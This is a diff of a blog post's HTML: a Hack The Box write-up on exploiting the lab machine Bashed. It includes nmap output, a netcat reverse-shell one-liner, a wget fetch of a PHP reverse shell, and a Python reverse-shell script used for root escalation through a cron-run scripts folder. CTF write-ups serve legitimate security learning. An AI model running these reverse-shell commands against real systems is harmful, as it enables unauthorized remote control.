@@ -19,7 +19,7 @@
   <meta name="description" content="Introduction Target: 10.10.10.68 (OS: Linux)
 Kali linux: 10.10.16.44
 Information Enumeration Firstly, detect the open ports:
-# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http  Only port 80 is open, it may be an easy box." />
+# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http Only port 80 is open, it may be an easy box." />
 
   
   
@@ -30,14 +30,13 @@ Information Enumeration Firstly, detect the open ports:
   <meta property="og:description" content="Introduction Target: 10.10.10.68 (OS: Linux)
 Kali linux: 10.10.16.44
 Information Enumeration Firstly, detect the open ports:
-# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http  Only port 80 is open, it may be an easy box." />
+# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http Only port 80 is open, it may be an easy box." />
   <meta property="og:url" content="https://madneal.com/post/bashed-hack-the-box/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
 
 
 
-<meta name="generator" content="Hugo 0.46" />
 
 
 <link rel="canonical" href="https://madneal.com/post/bashed-hack-the-box/" />
@@ -223,103 +222,63 @@ Information Enumeration Firstly, detect the open ports:
       <h1 class="post-title">Bashed -- hack the box</h1>
       <p class="post-meta">@Neal · Apr 4, 2019 · 3 min read</p>
     </header>
-    <article class="post-content">
-
-<p><a href="https://imgchr.com/i/AgdMvj"><img src="https://s2.ax1x.com/2019/04/03/AgdMvj.md.png" alt="AgdMvj.md.png" /></a></p>
-
+    <article class="post-content"><p><a href="https://imgchr.com/i/AgdMvj"><img src="https://s2.ax1x.com/2019/04/03/AgdMvj.md.png" alt="AgdMvj.md.png"></a></p>
 <h2 id="introduction">Introduction</h2>
-
 <p>Target: 10.10.10.68 (OS: Linux)</p>
-
 <p>Kali linux: 10.10.16.44</p>
-
 <h2 id="information-enumeration">Information Enumeration</h2>
-
 <p>Firstly, detect the open ports:</p>
-
-<pre><code># Nmap 7.70 scan initiated Wed Apr  3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68
+<pre tabindex="0"><code># Nmap 7.70 scan initiated Wed Apr  3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68
 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10).
 Nmap scan report for 10.10.10.68
 Host is up (0.31s latency).
 Not shown: 39680 closed ports, 25854 filtered ports
 PORT   STATE SERVICE
 80/tcp open  http
-</code></pre>
-
-<p>Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.</p>
-
+</code></pre><p>Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.</p>
 <p>Then, detect the services of the port 80, it may be a kind of http service.</p>
-
-<pre><code># Nmap 7.70 scan initiated Wed Apr  3 20:55:27 2019 as: nmap -sC -sV -p 80 -oA services 10.10.10.68
+<pre tabindex="0"><code># Nmap 7.70 scan initiated Wed Apr  3 20:55:27 2019 as: nmap -sC -sV -p 80 -oA services 10.10.10.68
 Nmap scan report for 10.10.10.68
 Host is up (0.35s latency).
 
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Arrexel's Development Site
-</code></pre>
-
-<p>Nothing special. Then access the http service and find more.</p>
-
+|_http-title: Arrexel&#39;s Development Site
+</code></pre><p>Nothing special. Then access the http service and find more.</p>
 <h2 id="exploit">Exploit</h2>
-
 <h3 id="http">Http</h3>
-
 <p>Access to <code>http://10.10.10.68</code>, and it seems to be a simple blog which talks about <code>phpbash</code>.</p>
-
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfJCd.png" alt="AgfJCd.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/04/04/AgfJCd.png" alt="AgfJCd.png"></p>
 <p><code>phpbash</code> seems to be a webshell tool. And there is a github repository <a href="https://github.com/Arrexel/phpbash">phpbash</a> introduces the tool. The introduction of the repo is to drop the file to target and access it by <code>http://ip/uploads/phpbash.php</code>. Try to access <code>http://10.10.10.68/uploads/phpbash.php</code>. But the file seems not to be here.</p>
-
 <p>Utilize the dirbuster to enumerate the directories.</p>
-
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfTPJ.png" alt="AgfTPJ.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/04/04/AgfTPJ.png" alt="AgfTPJ.png"></p>
 <p>Wow. Find it and open the file <code>phpbash.php</code>. Here is the webshell. I have tried to reverse shell by <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f</code>. But the shell cannot be returned. Whatever, I can obtain the user.txt.</p>
-
-<p><img src="https://s2.ax1x.com/2019/04/04/AghFMt.png" alt="AghFMt.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/04/04/AghFMt.png" alt="AghFMt.png"></p>
 <p>It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found <a href="https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php">here</a>. And I server the php script by <code>python -m SimpleHTTPServer 80</code>. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: <code>/tmp</code>.</p>
-
-<p><a href="https://imgchr.com/i/AghBsx"><img src="https://s2.ax1x.com/2019/04/04/AghBsx.png" alt="AghBsx.png" /></a></p>
-
+<p><a href="https://imgchr.com/i/AghBsx"><img src="https://s2.ax1x.com/2019/04/04/AghBsx.png" alt="AghBsx.png"></a></p>
 <p><code>wget http://10.10.16.44/php-reverse-shell.php</code></p>
-
 <p>Then in the kali, set the <code>nc</code> listen to port 1234:</p>
-
 <p><code>nc -lvnp 1234</code></p>
-
 <p>Execute the php script in the target machine <code>php php-reverse-shell.php</code>. OK. We obtain the reverse shell.</p>
-
-<p><a href="https://imgchr.com/i/AghhQI"><img src="https://s2.ax1x.com/2019/04/04/AghhQI.png" alt="AghhQI.png" /></a></p>
-
+<p><a href="https://imgchr.com/i/AghhQI"><img src="https://s2.ax1x.com/2019/04/04/AghhQI.png" alt="AghhQI.png"></a></p>
 <h2 id="privilege-escalation">Privilege escalation</h2>
-
 <p>Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize <code>sudo -l</code> to see the permissions of the user. Something interesting found. We can switch to <code>scriptmanager</code> user without password.</p>
-
-<p><img src="https://s2.ax1x.com/2019/04/04/Ag4cn0.png" alt="Ag4cn0.png" /></p>
-
-<pre><code>su -u scrriptmanager bash -i
-</code></pre>
-
-<p>Try to enumerate the files. And I find an interesting folder inside <code>/scripts</code>. There are two files <code>test.py</code> and <code>test.txt</code>. Try to display the content of <code>test.py</code>.</p>
-
-<p><a href="https://imgchr.com/i/AghxO0"><img src="https://s2.ax1x.com/2019/04/04/AghxO0.png" alt="AghxO0.png" /></a></p>
-
+<p><img src="https://s2.ax1x.com/2019/04/04/Ag4cn0.png" alt="Ag4cn0.png"></p>
+<pre tabindex="0"><code>su -u scrriptmanager bash -i
+</code></pre><p>Try to enumerate the files. And I find an interesting folder inside <code>/scripts</code>. There are two files <code>test.py</code> and <code>test.txt</code>. Try to display the content of <code>test.py</code>.</p>
+<p><a href="https://imgchr.com/i/AghxO0"><img src="https://s2.ax1x.com/2019/04/04/AghxO0.png" alt="AghxO0.png"></a></p>
 <p>The python script is quite straightforward. It just writes <code>testing 123!</code> to the file <code>test.txt</code>. And if we see the attributes of <code>test.txt</code>, the modified time of the file changes each minute. And the file is owned by root. It seems that <code>root</code> will execute the python scripts in <code>/scripts</code> folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
-s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);
-s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.16.44&#34;</span>,<span style="color:#ae81ff">4444</span>));
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); 
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>);
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);
-p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);</code></pre></div>
-<p>Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.</p>
-
-<p><img src="https://s2.ax1x.com/2019/04/04/AgICRJ.png" alt="AgICRJ.png" /></p>
-
-<p><a href="https://imgchr.com/i/AgIks1"><img src="https://s2.ax1x.com/2019/04/04/AgIks1.png" alt="AgIks1.png" /></a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.16.44&#34;</span>,<span style="color:#ae81ff">4444</span>));
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); 
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);
+</span></span></code></pre></div><p>Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.</p>
+<p><img src="https://s2.ax1x.com/2019/04/04/AgICRJ.png" alt="AgICRJ.png"></p>
+<p><a href="https://imgchr.com/i/AgIks1"><img src="https://s2.ax1x.com/2019/04/04/AgIks1.png" alt="AgIks1.png"></a></p>
 </article>
     <footer class="post-footer">
         <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
@@ -338,13 +297,13 @@ p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</sp
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1133</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1146</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
       <div id="disqus_thread"></div>
-<script>
-    var disqus_config = function () {
+<script type="application/javascript">
+    window.disqus_config = function () {
     
     
     
@@ -398,7 +357,7 @@ p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</sp
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
 
 
-<script>
+<script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
